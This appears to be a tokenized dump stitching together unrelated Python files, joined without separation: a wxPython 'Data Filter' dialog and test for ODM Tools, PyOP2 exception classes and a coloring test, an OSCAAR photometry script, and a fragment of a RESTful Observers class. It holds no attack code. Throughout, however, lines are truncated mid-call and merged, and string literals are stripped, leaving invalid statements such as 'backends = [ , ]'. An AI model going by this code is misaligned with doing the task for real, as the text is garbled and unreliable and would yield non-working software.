~~~ self . txtMethodDescrip . SetValue ( "Method Description" ) \n 
\n 
~~ event . Skip ( ) \n 
\n 
\n 
~~ def getMethod ( self ) : \n 
\n 
~~~ m = Method ( ) \n 
if self . rbGenerate . Value : \n 
~~~ genmethod = "Values derived from ODM Tools Python" \n 
\n 
try : \n 
~~~ m = self . series_service . get_method_by_description ( genmethod ) \n 
~~ except : \n 
~~~ m . description = genmethod \n 
\n 
~~ ~~ elif self . rbSelect . Value : \n 
~~~ index = self . lstMethods . GetFirstSelected ( ) \n 
desc = self . lstMethods . GetItem ( index , 0 ) . GetText ( ) \n 
\n 
logger . debug ( desc ) \n 
m = self . series_service . get_method_by_description ( desc ) \n 
\n 
\n 
\n 
~~ elif self . rbCreateNew . Value : \n 
~~~ m . description = self . txtMethodDescrip . GetValue ( ) \n 
~~ return m # -*- coding: utf-8 -*-  \n 
\n 
# ########################################################################## \n 
# # Python code generated with wxFormBuilder (version Feb 26 2014) \n 
## http://www.wxformbuilder.org/ \n 
## \n 
## PLEASE DO "NOT" EDIT THIS FILE! \n 
########################################################################### \n 
\n 
~~ ~~ import wx \n 
import wx . xrc \n 
import wx . lib . masked as masked \n 
\n 
########################################################################### \n 
## Class clsDataFilters \n 
########################################################################### \n 
\n 
class clsDataFilters ( wx . Dialog ) : \n 
\n 
\n 
~~~ def __init__ ( self , parent ) : \n 
\n 
~~~ wx . Dialog . __init__ ( self , parent , id = wx . ID_ANY , title = u"Data Filter" , pos = wx . Point ( 599 , 384 ) , size = wx . Size ( 382 , 500 ) , style = wx . DEFAULT_DIALOG_STYLE | wx . RESIZE_BORDER ) \n 
self . SetSizeHintsSz ( wx . Size ( 358 , 452 ) , wx . DefaultSize ) \n 
\n 
bSizer1 = wx . BoxSizer ( wx . VERTICAL ) \n 
\n 
bSizer3 = wx . BoxSizer ( wx . VERTICAL ) \n 
\n 
bsValueThresh = wx . BoxSizer ( wx . HORIZONTAL ) \n 
\n 
self . rbThreshold = wx . RadioButton ( self , wx . ID_ANY , wx . EmptyString , wx . Point ( 10 , 8 ) , wx . DefaultSize self . rbThreshold . SetValue ( True ) \n 
bsValueThresh . Add ( self . rbThreshold , 0 , wx . ALL , 5 ) \n 
\n 
sbThreshold = wx . StaticBoxSizer ( wx . StaticBox ( self , wx . ID_ANY , u"Value Threshold" ) , wx . VERTICAL \n 
fgSizer1 = wx . FlexGridSizer ( 0 , 2 , 0 , 0 ) \n 
fgSizer1 . SetFlexibleDirection ( wx . HORIZONTAL ) \n 
fgSizer1 . SetNonFlexibleGrowMode ( wx . FLEX_GROWMODE_SPECIFIED ) \n 
\n 
self . lblChangegt = wx . StaticText ( self , wx . ID_ANY , u"Value >" , wx . DefaultPosition , wx . DefaultSize self . lblChangegt . Wrap ( - 1 ) \n 
fgSizer1 . Add ( self . lblChangegt , 0 , wx . ALL , 5 ) \n 
\n 
self . txtThreshValGT = wx . TextCtrl ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx . Size fgSizer1 . Add ( self . txtThreshValGT , 1 , wx . ALL | wx . EXPAND , 5 ) \n 
\n 
self . lblChangelt = wx . StaticText ( self , wx . ID_ANY , u"Value <" , wx . DefaultPosition , wx . DefaultSize self . lblChangelt . Wrap ( - 1 ) \n 
fgSizer1 . Add ( self . lblChangelt , 0 , wx . ALL , 5 ) \n 
\n 
self . txtThreshValLT = wx . TextCtrl ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx . Size fgSizer1 . Add ( self . txtThreshValLT , 1 , wx . ALL | wx . EXPAND , 5 ) \n 
\n 
sbThreshold . Add ( fgSizer1 , 0 , wx . EXPAND , 5 ) \n 
\n 
bsValueThresh . Add ( sbThreshold , 1 , 0 , 5 ) \n 
\n 
bSizer3 . Add ( bsValueThresh , 1 , wx . EXPAND , 5 ) \n 
\n 
bsGaps = wx . BoxSizer ( wx . HORIZONTAL ) \n 
\n 
self . rbDataGaps = wx . RadioButton ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx . DefaultSize bsGaps . Add ( self . rbDataGaps , 1 , wx . ALL , 5 ) \n 
\n 
sbGaps = wx . StaticBoxSizer ( wx . StaticBox ( self , wx . ID_ANY , u"Data Gaps" ) , wx . VERTICAL ) \n 
\n 
fgSizer2 = wx . FlexGridSizer ( 0 , 2 , 0 , 0 ) \n 
fgSizer2 . SetFlexibleDirection ( wx . HORIZONTAL ) \n 
fgSizer2 . SetNonFlexibleGrowMode ( wx . FLEX_GROWMODE_SPECIFIED ) \n 
\n 
self . lblGapsVal = wx . StaticText ( self , wx . ID_ANY , u"Value:" , wx . DefaultPosition , wx . DefaultSize self . lblGapsVal . Wrap ( - 1 ) \n 
fgSizer2 . Add ( self . lblGapsVal , 0 , wx . ALL , 5 ) \n 
\n 
self . txtGapsVal = wx . TextCtrl ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx . Size ( 230 fgSizer2 . Add ( self . txtGapsVal , 0 , wx . ALL , 5 ) \n 
\n 
self . lblGapsTime = wx . StaticText ( self , wx . ID_ANY , u"Time Period:" , wx . DefaultPosition , wx . DefaultSize self . lblGapsTime . Wrap ( - 1 ) \n 
fgSizer2 . Add ( self . lblGapsTime , 0 , wx . ALL , 5 ) \n 
\n 
cbGapTimeChoices = [ u"second" , u"minute" , u"hour" , u"day" ] \n 
self . cbGapTime = wx . ComboBox ( self , wx . ID_ANY , u"second" , wx . DefaultPosition , wx . Size ( 230 , - 1 wx . CB_READONLY ) \n 
fgSizer2 . Add ( self . cbGapTime , 0 , wx . ALL , 5 ) \n 
\n 
sbGaps . Add ( fgSizer2 , 1 , wx . EXPAND , 5 ) \n 
\n 
bsGaps . Add ( sbGaps , 0 , 0 , 5 ) \n 
\n 
bSizer3 . Add ( bsGaps , 0 , 0 , 5 ) \n 
\n 
bsDate = wx . BoxSizer ( wx . HORIZONTAL ) \n 
\n 
self . rbDate = wx . RadioButton ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx . DefaultSize bsDate . Add ( self . rbDate , 0 , wx . ALL , 5 ) \n 
\n 
sbDate = wx . StaticBoxSizer ( wx . StaticBox ( self , wx . ID_ANY , u"Date" ) , wx . VERTICAL ) \n 
\n 
fgSizer3 = wx . FlexGridSizer ( 0 , 4 , 0 , 0 ) \n 
fgSizer3 . SetFlexibleDirection ( wx . HORIZONTAL ) \n 
fgSizer3 . SetNonFlexibleGrowMode ( wx . FLEX_GROWMODE_SPECIFIED ) \n 
\n 
self . lblDateAfter = wx . StaticText ( self , wx . ID_ANY , u"Start:" , wx . DefaultPosition , wx . DefaultSize self . lblDateAfter . Wrap ( - 1 ) \n 
fgSizer3 . Add ( self . lblDateAfter , 0 , wx . ALL , 5 ) \n 
\n 
self . dpAfter = wx . DatePickerCtrl ( self , wx . ID_ANY , wx . DefaultDateTime , wx . DefaultPosition , wx wx . DP_DROPDOWN | wx . DP_SHOWCENTURY ) \n 
fgSizer3 . Add ( self . dpAfter , 0 , wx . ALL , 5 ) \n 
\n 
self . sbAfter = wx . SpinButton ( self , wx . ID_ANY , wx . DefaultPosition , wx . Size ( 15 , - 1 ) , 0 ) \n 
\n 
self . tpAfter = masked . TimeCtrl ( self , wx . ID_ANY , pos = wx . DefaultPosition , size = wx . Size ( 80 , - 1 ) name = "24 hour control" , \n 
fmt24hr = True , spinButton = self . sbAfter , oob_color = "White" ) \n 
# self.tpAfter.Wrap( -1 ) \n 
fgSizer3 . Add ( self . tpAfter , 0 , wx . ALL , 5 ) \n 
\n 
fgSizer3 . Add ( self . sbAfter , 0 , wx . ALL , 5 ) \n 
\n 
self . lblDateBefore = wx . StaticText ( self , wx . ID_ANY , u"End: " , wx . DefaultPosition , wx . DefaultSize self . lblDateBefore . Wrap ( - 1 ) \n 
fgSizer3 . Add ( self . lblDateBefore , 0 , wx . ALL , 5 ) \n 
\n 
self . dpBefore = wx . DatePickerCtrl ( self , wx . ID_ANY , wx . DefaultDateTime , wx . DefaultPosition , wx wx . DP_DROPDOWN | wx . DP_SHOWCENTURY ) \n 
fgSizer3 . Add ( self . dpBefore , 0 , wx . ALL , 5 ) \n 
self . sbBefore = wx . SpinButton ( self , wx . ID_ANY , wx . DefaultPosition , wx . Size ( 15 , - 1 ) , wx . SP_WRAP self . tpBefore = masked . TimeCtrl ( self , wx . ID_ANY , pos = wx . DefaultPosition , size = wx . Size ( 80 , - 1 name = "24 hour control" , \n 
fmt24hr = True , spinButton = self . sbBefore , oob_color = ) \n 
fgSizer3 . Add ( self . tpBefore , 0 , wx . ALL , 5 ) \n 
fgSizer3 . Add ( self . sbBefore , 0 , wx . ALL , 5 ) \n 
sbDate . Add ( fgSizer3 , 1 , wx . EXPAND , 5 ) \n 
\n 
bsDate . Add ( sbDate , 1 , wx . EXPAND , 5 ) \n 
\n 
bSizer3 . Add ( bsDate , 0 , wx . EXPAND , 5 ) \n 
\n 
bsValChange = wx . BoxSizer ( wx . HORIZONTAL ) \n 
\n 
self . rbVChangeThresh = wx . RadioButton ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx bsValChange . Add ( self . rbVChangeThresh , 0 , wx . ALL , 5 ) \n 
\n 
sbValChange = wx . StaticBoxSizer ( wx . StaticBox ( self , wx . ID_ANY , u"Value Change Threshold" ) , wx \n 
fgSizer4 = wx . FlexGridSizer ( 0 , 2 , 0 , 0 ) \n 
fgSizer4 . SetFlexibleDirection ( wx . HORIZONTAL ) \n 
fgSizer4 . SetNonFlexibleGrowMode ( wx . FLEX_GROWMODE_SPECIFIED ) \n 
\n 
self . lblChangeGT = wx . StaticText ( self , wx . ID_ANY , u"Value >" , wx . DefaultPosition , wx . DefaultSize self . lblChangeGT . Wrap ( - 1 ) \n 
fgSizer4 . Add ( self . lblChangeGT , 0 , wx . ALL , 5 ) \n 
\n 
self . txtVChangeGT = wx . TextCtrl ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx . Size fgSizer4 . Add ( self . txtVChangeGT , 0 , wx . ALL , 5 ) \n 
\n 
self . lblChangeLT = wx . StaticText ( self , wx . ID_ANY , u"Value <" , wx . DefaultPosition , wx . DefaultSize self . lblChangeLT . Wrap ( - 1 ) \n 
fgSizer4 . Add ( self . lblChangeLT , 0 , wx . ALL , 5 ) \n 
\n 
self . txtVChangeLT = wx . TextCtrl ( self , wx . ID_ANY , wx . EmptyString , wx . DefaultPosition , wx . Size fgSizer4 . Add ( self . txtVChangeLT , 0 , wx . ALL , 5 ) \n 
\n 
sbValChange . Add ( fgSizer4 , 1 , wx . EXPAND , 5 ) \n 
\n 
bsValChange . Add ( sbValChange , 1 , 0 , 5 ) \n 
\n 
bSizer3 . Add ( bsValChange , 1 , wx . EXPAND , 5 ) \n 
\n 
self . chkToggleFilterSelection = wx . CheckBox ( self , wx . ID_ANY , u"Filter from previous filter" , wx . DefaultSize , 0 ) \n 
bSizer3 . Add ( self . chkToggleFilterSelection , 1 , wx . ALL | wx . EXPAND , 5 ) \n 
\n 
bsButtons = wx . BoxSizer ( wx . HORIZONTAL ) \n 
\n 
self . btnOK = wx . Button ( self , wx . ID_ANY , u"OK" , wx . DefaultPosition , wx . Size ( 64 , 23 ) , 0 ) \n 
bsButtons . Add ( self . btnOK , 1 , wx . ALL | wx . EXPAND , 5 ) \n 
\n 
self . btnCancel = wx . Button ( self , wx . ID_ANY , u"Cancel" , wx . DefaultPosition , wx . Size ( 64 , 23 ) , bsButtons . Add ( self . btnCancel , 1 , wx . ALL | wx . EXPAND , 5 ) \n 
\n 
self . btnApply = wx . Button ( self , wx . ID_ANY , u"Apply" , wx . DefaultPosition , wx . Size ( 64 , 23 ) , 0 ) bsButtons . Add ( self . btnApply , 1 , wx . ALL | wx . EXPAND , 5 ) \n 
\n 
self . btnClear = wx . Button ( self , wx . ID_ANY , u"Clear Filter" , wx . DefaultPosition , wx . Size ( 64 , bsButtons . Add ( self . btnClear , 1 , wx . ALL | wx . EXPAND , 5 ) \n 
\n 
bSizer3 . Add ( bsButtons , 1 , wx . EXPAND , 0 ) \n 
\n 
bSizer1 . Add ( bSizer3 , 1 , wx . EXPAND , 5 ) \n 
\n 
self . SetSizer ( bSizer1 ) \n 
self . Layout ( ) \n 
\n 
self . Centre ( wx . BOTH ) # Connect Events \n 
self . txtThreshValGT . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . txtThreshValLT . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . txtGapsVal . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . cbGapTime . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . dpAfter . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . tpAfter . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . sbAfter . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . dpBefore . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . tpBefore . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . sbBefore . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . txtVChangeGT . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . txtVChangeLT . Bind ( wx . EVT_SET_FOCUS , self . onSetFocus ) \n 
self . chkToggleFilterSelection . Bind ( wx . EVT_CHECKBOX , self . onCheckBox ) \n 
self . btnClear . Bind ( wx . EVT_BUTTON , self . onBtnClearButton ) \n 
self . btnOK . Bind ( wx . EVT_BUTTON , self . onBtnOKButton ) \n 
self . btnCancel . Bind ( wx . EVT_BUTTON , self . onBtnCancelButton ) \n 
self . btnApply . Bind ( wx . EVT_BUTTON , self . onBtnApplyButton ) \n 
\n 
\n 
~~ def __del__ ( self ) : \n 
~~~ pass \n 
\n 
\n 
# Virtual event handlers, overide them in your derived class \n 
\n 
\n 
~~ def onSetFocus ( self , event ) : \n 
~~~ event . Skip ( ) \n 
\n 
\n 
~~ def onCheckBox ( self , event ) : \n 
~~~ event . Skip ( ) \n 
\n 
\n 
~~ def onBtnClearButton ( self , event ) : \n 
~~~ event . Skip ( ) \n 
\n 
\n 
~~ def onBtnOKButton ( self , event ) : \n 
~~~ event . Skip ( ) \n 
\n 
\n 
~~ def onBtnCancelButton ( self , event ) : \n 
~~~ event . Skip ( ) \n 
\n 
\n 
~~ def onBtnApplyButton ( self , event ) : \n 
~~~ event . Skip ( ) \n 
\n 
# self.dpAfter = wx.DatePickerCtrl(self, wx.ID_ANY, wx.DefaultDateTime, wx.DefaultPosition, wx.Size(150, -1), #                                  wx.DP_DROPDOWN | wx.DP_SHOWCENTURY) \n 
# fgSizer3.Add(self.dpAfter, 0, wx.ALL, 5) \n 
# \n 
# self.sbAfter = wx.SpinButton(self, wx.ID_ANY, wx.DefaultPosition, wx.Size(15, -1), 0) \n 
# \n 
# self.tpAfter = masked.TimeCtrl(self, wx.ID_ANY, pos=wx.DefaultPosition, size=wx.Size(80, -1), \n 
#                                name="24 hour control", \n 
#                                fmt24hr=True, spinButton=self.sbAfter, oob_color="White") \n 
# # self.tpAfter.Wrap( -1 ) \n 
# fgSizer3.Add(self.tpAfter, 0, wx.ALL, 5) \n 
# \n 
# fgSizer3.Add(self.sbAfter, 0, wx.ALL, 5) \n 
# \n 
# self.lblDateBefore = wx.StaticText(self, wx.ID_ANY, u"End: ", wx.DefaultPosition, wx.DefaultSize, 0) # self.lblDateBefore.Wrap(-1) \n 
# fgSizer3.Add(self.lblDateBefore, 0, wx.ALL, 5) \n 
# \n 
# self.dpBefore = wx.DatePickerCtrl(self, wx.ID_ANY, wx.DefaultDateTime, wx.DefaultPosition, wx.Size(150, -1), #                                   wx.DP_DROPDOWN | wx.DP_SHOWCENTURY) \n 
# fgSizer3.Add(self.dpBefore, 0, wx.ALL, 5) \n 
# self.sbBefore = wx.SpinButton(self, wx.ID_ANY, wx.DefaultPosition, wx.Size(15, -1), wx.SP_WRAP) # self.tpBefore = masked.TimeCtrl(self, wx.ID_ANY, pos=wx.DefaultPosition, size=wx.Size(80, -1), #                                 name="24 hour control", \n 
\n 
\n 
~~ ~~ from odmtools . odmdata import SessionFactory \n 
\n 
\n 
class TestSessionFactory : \n 
~~~ def setup ( self ) : \n 
~~~ self . connection_string = "sqlite:///:memory:" \n 
self . session_factory = SessionFactory ( self . connection_string , echo = True ) \n 
\n 
~~ def test_create_session_factory ( self ) : \n 
~~~ assert repr ( self . session_factory ) == "<SessionFactory(\'Engine(%s)\')>" % self . connection_string assert self . session_factory . Session != None \n 
\n 
~~ def test_get_session ( self ) : \n 
~~~ session = self . session_factory . get_session ( ) \n 
assert in repr ( session ) # This file is part of PyOP2 \n 
# \n 
# PyOP2 is Copyright (c) 2012, Imperial College London and \n 
# others. Please see the AUTHORS file in the main source directory for \n 
# a full list of copyright holders.  All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions \n 
# are met: \n 
# \n 
#     * Redistributions of source code must retain the above copyright \n 
#       notice, this list of conditions and the following disclaimer. \n 
#     * Redistributions in binary form must reproduce the above copyright \n 
#       notice, this list of conditions and the following disclaimer in the \n 
#       documentation and/or other materials provided with the distribution. \n 
#     * The name of Imperial College London or that of other \n 
#       contributors may not be used to endorse or promote products \n 
#       derived from this software without specific prior written \n 
#       permission. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTERS \n 
\n 
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS \n 
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE \n 
# COPYRIGHT HOLDERS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, \n 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES \n 
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR \n 
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) \n 
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, \n 
# STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED \n 
# OF THE POSSIBILITY OF SUCH DAMAGE. \n 
\n 
~~ ~~ """OP2 exception types""" \n 
\n 
\n 
class DataTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for data.""" \n 
\n 
\n 
~~ class DimTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for dimension.""" \n 
\n 
\n 
~~ class ArityTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for arity.""" \n 
\n 
\n 
~~ class IndexTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for index.""" \n 
\n 
\n 
~~ class NameTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for name.""" \n 
\n 
\n 
~~ class SetTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for :class:`pyop2.op2.Set`.""" \n 
\n 
\n 
~~ class SizeTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for size.""" \n 
\n 
\n 
~~ class SubsetIndexOutOfBounds ( TypeError ) : \n 
\n 
~~~ """Out of bound index.""" \n 
\n 
\n 
~~ class SparsityTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for :class:`pyop2.op2.Sparsity`.""" \n 
\n 
\n 
~~ class MapTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for :class:`pyop2.op2.Map`.""" \n 
\n 
\n 
~~ class DataSetTypeError ( TypeError ) : \n 
~~~ """Invalid type for :class:`pyop2.op2.DataSet`.""" \n 
\n 
\n 
~~ class MatTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for :class:`pyop2.op2.Mat`.""" \n 
\n 
\n 
~~ class DatTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for :class:`pyop2.op2.Dat`.""" \n 
\n 
\n 
~~ class KernelTypeError ( TypeError ) : \n 
\n 
~~~ """Invalid type for :class:`pyop2.op2.Kernel`.""" \n 
\n 
\n 
~~ class DataValueError ( ValueError ) : \n 
\n 
~~~ """Illegal value for data.""" \n 
\n 
\n 
~~ class IndexValueError ( ValueError ) : \n 
\n 
~~~ """Illegal value for index.""" \n 
\n 
\n 
~~ class ModeValueError ( ValueError ) : \n 
\n 
~~~ """Illegal value for mode.""" \n 
\n 
\n 
~~ class IterateValueError ( ValueError ) : \n 
\n 
~~~ """Illegal value for iterate.""" \n 
\n 
\n 
~~ class SetValueError ( ValueError ) : \n 
\n 
~~~ """Illegal value for :class:`pyop2.op2.Set`.""" \n 
\n 
\n 
~~ class MapValueError ( ValueError ) : \n 
\n 
~~~ """Illegal value for :class:`pyop2.op2.Map`.""" \n 
\n 
\n 
~~ class ConfigurationError ( RuntimeError ) : \n 
\n 
~~~ """Illegal configuration value or type.""" \n 
\n 
\n 
~~ class CompilationError ( RuntimeError ) : \n 
\n 
~~~ """Error during JIT compilation""" \n 
# This file is part of PyOP2 \n 
# \n 
# PyOP2 is Copyright (c) 2012, Imperial College London and \n 
# others. Please see the AUTHORS file in the main source directory for \n 
# a full list of copyright holders.  All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions \n 
# are met: \n 
# \n 
#     * Redistributions of source code must retain the above copyright \n 
#       notice, this list of conditions and the following disclaimer. \n 
#     * Redistributions in binary form must reproduce the above copyright \n 
#       notice, this list of conditions and the following disclaimer in the \n 
#       documentation and/or other materials provided with the distribution. \n 
#     * The name of Imperial College London or that of other \n 
#       contributors may not be used to endorse or promote products \n 
#       derived from this software without specific prior written \n 
#       permission. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTERS \n 
\n 
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS \n 
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE \n 
# COPYRIGHT HOLDERS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, \n 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES \n 
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR \n 
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) \n 
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, \n 
# STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED \n 
# OF THE POSSIBILITY OF SUCH DAMAGE. \n 
\n 
~~ import pytest \n 
import numpy \n 
from random import randrange \n 
\n 
from pyop2 import plan as _plan \n 
from pyop2 import op2 \n 
\n 
backends = [ , ] \n 
\n 
# Data type \n 
valuetype = numpy . float64 \n 
\n 
# Constants \n 
NUM_ELE = 12 \n 
NUM_NODES = 36 \n 
NUM_ENTRIES = 4 \n 
\n 
\n 
class TestColoring : \n 
\n 
~~~ """\n    Coloring tests\n\n    """ \n 
\n 
@ pytest . fixture \n 
def nodes ( cls ) : \n 
~~~ return op2 . Set ( NUM_NODES , "nodes" ) \n 
\n 
~~ @ pytest . fixture \n 
def elements ( cls ) : \n 
~~~ return op2 . Set ( NUM_ELE , "elements" ) \n 
\n 
~~ @ pytest . fixture \n 
def dnodes ( cls , nodes ) : \n 
~~~ return op2 . DataSet ( nodes , 1 , "dnodes" ) \n 
\n 
~~ @ pytest . fixture \n 
def elem_node_map ( cls ) : \n 
~~~ v = [ randrange ( NUM_ENTRIES ) for i in range ( NUM_ELE * 3 ) ] \n 
return numpy . asarray ( v , dtype = numpy . uint32 ) \n 
\n 
~~ @ pytest . fixture \n 
def elem_node ( cls , elements , nodes , elem_node_map ) : \n 
~~~ return op2 . Map ( elements , nodes , 3 , elem_node_map , "elem_node" ) \n 
\n 
~~ @ pytest . fixture \n 
def mat ( cls , elem_node , dnodes ) : \n 
~~~ sparsity = op2 . Sparsity ( ( dnodes , dnodes ) , ( elem_node , elem_node ) , "sparsity" ) \n 
return op2 . Mat ( sparsity , valuetype , "mat" ) \n 
\n 
~~ @ pytest . fixture \n 
def x ( cls , dnodes ) : \n 
~~~ return op2 . Dat ( dnodes , numpy . zeros ( NUM_NODES , dtype = numpy . uint32 ) , numpy . uint32 , "x" ) \n 
\n 
~~ def test_thread_coloring ( self , backend , skip_opencl , elements , elem_node_map , elem_node , mat , x ) ~~~ assert NUM_ELE % 2 == 0 , "NUM_ELE must be even." \n 
\n 
plan = _plan . Plan ( elements . all_part , \n 
mat ( op2 . INC , ( elem_node [ op2 . i [ 0 ] ] , \n 
elem_node [ op2 . i [ 1 ] ] ) ) , \n 
x ( op2 . WRITE , elem_node [ 0 ] ) , \n 
partition_size = NUM_ELE / 2 , \n 
matrix_coloring = True ) \n 
\n 
assert plan . nblocks == 2 \n 
eidx = 0 \n 
for p in range ( plan . nblocks ) : \n 
~~~ for thrcol in range ( plan . nthrcol [ p ] ) : \n 
~~~ counter = numpy . zeros ( NUM_NODES , dtype = numpy . uint32 ) \n 
for e in range ( eidx , eidx + plan . nelems [ p ] ) : \n 
~~~ if plan . thrcol [ e ] == thrcol : \n 
~~~ counter [ elem_node . values [ e ] [ 0 ] ] += 1 \n 
~~ ~~ assert ( counter < 2 ) . all ( ) \n 
\n 
~~ eidx += plan . nelems [ p ] \n 
~~ ~~ ~~ """\nOSCAAR/Code/differentialPhotometry.py\n\nLoad in the images and analysis parameters set in the Code/init.par\nfile, loop through each star within each image, for all images, and\nmeasure the stellar centroid positions and fluxes. Save these data\nto the oscaar.dataBank() object, and save that out to a binary\n"pickle".\n\n\nCore developer: Brett Morris\n""" \n 
\n 
from matplotlib import pyplot as plt \n 
\n 
import oscaar \n 
import astrometry \n 
import photometry \n 
import dataBank \n 
import systematics \n 
import IO \n 
import pyfits \n 
\n 
# Turn on interactive plots \n 
plt . ion ( ) \n 
\n 
# initalize databank for data storage \n 
data = dataBank . dataBank ( ) \n 
# Store initialized dictionary \n 
allStars = data . getDict ( ) \n 
outputPath = data . outputPath \n 
N_exposures = len ( data . getPaths ( ) ) \n 
\n 
# Prepare systematic corrections: dark frame, flat field \n 
meanDarkFrame = data . getMeanDarkFrame ( ) \n 
masterFlat = data . masterFlat \n 
\n 
# Tell oscaar what figure settings to use \n 
plottingThings , statusBarFig , statusBarAx = IO . plottingSettings ( data . trackPlots , data . photPlots ) \n 
\n 
# Main loop: iterate through each exposures \n 
for expNumber in xrange ( N_exposures ) : \n 
~~~ if statusBarAx is not None and expNumber % 15 == 0 : \n 
# Prepare some plotting settings here \n 
~~~ plt . cla ( ) \n 
statusBarAx . set_title ( ) \n 
statusBarAx . set_xlim ( [ 0 , 100 ] ) \n 
statusBarAx . set_xlabel ( ) \n 
statusBarAx . get_yaxis ( ) . set_ticks ( [ ] ) \n 
statusBarAx . barh ( [ 0 ] , [ 100.0 * expNumber / len ( data . getPaths ( ) ) ] , \n 
[ 1 ] , color = ) \n 
\n 
# Open image from FITS file \n 
~~ image = ( pyfits . getdata ( data . getPaths ( ) [ expNumber ] ) - meanDarkFrame ) / masterFlat \n 
# Store the exposure time from the FITS header \n 
data . storeTime ( expNumber ) \n 
\n 
# Iterate through each star in each exposure \n 
for star in allStars : \n 
~~~ est_x , est_y = data . centroidInitialGuess ( expNumber , star ) \n 
# Find the stellar centroid \n 
x , y , radius , trackFlag = astrometry . trackSmooth ( image , est_x , est_y , \n 
data . smoothConst , \n 
plottingThings , \n 
zoom = data . trackingZoom , \n 
plots = data . trackPlots ) \n 
# Store the centroid positions \n 
data . storeCentroid ( star , expNumber , x , y ) \n 
# Measure the flux and uncertainty, centered on the previously found \n 
# stellar centroid \n 
fluxes , errors , photFlags = photometry . multirad ( image , x , y , \n 
data . apertureRadii , \n 
plottingThings , \n 
ccdGain = data . ccdGain , \n 
plots = data . photPlots ) \n 
photFlag = any ( photFlags ) \n 
# Store the flux and uncertainty in the data object \n 
data . storeFluxes ( star , expNumber , fluxes , errors ) \n 
\n 
if trackFlag or photFlag and not data . getFlag ( ) : \n 
# Store error flags \n 
~~~ data . setFlag ( star , False ) \n 
~~ if data . trackPlots or data . photPlots : \n 
# More plotting settings \n 
~~~ plt . draw ( ) \n 
\n 
~~ ~~ if statusBarAx is not None and expNumber % 15 == 0 : \n 
# More plotting settings \n 
~~~ plt . draw ( ) \n 
\n 
~~ ~~ plt . close ( ) \n 
\n 
# Compute the scaled fluxes of each comparison star \n 
data . scaleFluxes_multirad ( ) \n 
\n 
# Calculate a composite comparison star by combining all comparisons \n 
meanComparisonStars , meanComparisonStarErrors = data . calcMeanComparison_multirad ( ccdGain = data . ccdGain ) \n 
\n 
# Calculate the light curve \n 
lightCurves , lightCurveErrors = data . computeLightCurve_multirad ( meanComparisonStars , \n 
meanComparisonStarErrors ) \n 
\n 
# Save the dataBank object for later use \n 
oscaar . IO . save ( data , outputPath ) \n 
\n 
# Plot the resulting light curve \n 
data . plotLightCurve_multirad ( ) \n 
\n 
from RESTfulResource import RESTfulResource \n 
from urlparse import urlparse \n 
\n 
class Observers ( RESTfulResource ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ RESTfulResource . __init__ ( self ) \n 
self . __schemes = [ , , ] \n 
self . __observers = [ ] \n 
\n 
~~ def onUpdate ( self , resource ) : \n 
~~~ self . __onUpdate ( resource ) \n 
\n 
